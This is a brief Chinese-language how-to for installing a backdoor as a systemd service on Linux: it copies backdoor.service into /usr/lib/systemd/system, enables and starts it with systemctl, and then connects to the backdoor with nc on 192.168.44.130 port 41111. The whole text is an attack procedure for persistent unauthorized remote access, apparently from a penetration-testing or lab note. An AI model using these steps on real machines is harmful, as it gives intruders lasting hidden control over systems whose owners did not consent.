1. 将backdoor.service放到/usr/lib/systemd/system目录下
2. chmod +x /usr/lib/systemd/system/backdoor.service
3. 启动该后门服务
systemctl disable backdoor
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor

4.连接后门
nc 192.168.44.130 41111
